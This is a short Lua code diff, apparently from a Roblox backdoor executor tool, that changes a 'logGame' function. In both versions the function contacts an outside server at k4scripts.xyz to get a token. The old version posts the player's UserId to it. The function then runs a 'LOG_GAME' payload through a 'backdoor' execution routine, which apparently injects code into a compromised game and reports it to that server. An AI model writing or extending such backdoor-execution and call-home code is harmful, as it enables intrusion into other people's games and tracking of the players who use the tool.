@@ -442,18 +442,8 @@ local function resetExecutionState()
 end;
 
 local function logGame()
-    local token = httpService:RequestAsync({
-        Url="https://k4scripts.xyz/bexe/token",
-        Method="POST",
-        Headers = {
-            ["Content-Type"] = "application/json"  -- When sending JSON, set this!
-        },
-        Body = game:GetService("HttpService"):JSONEncode({PlayerId = game.Players.LocalPlayer.UserId})
-    }).Body;
-
-    local completed = execute(applyMacros(LOG_GAME):format(token), backdoor, false, true);
-
-    completed:Wait();
+    local token = game:HttpGet("https://k4scripts.xyz/bexe/token");
+    execute(applyMacros(LOG_GAME):format(token), backdoor, true, true):Wait();
 end;
 
 
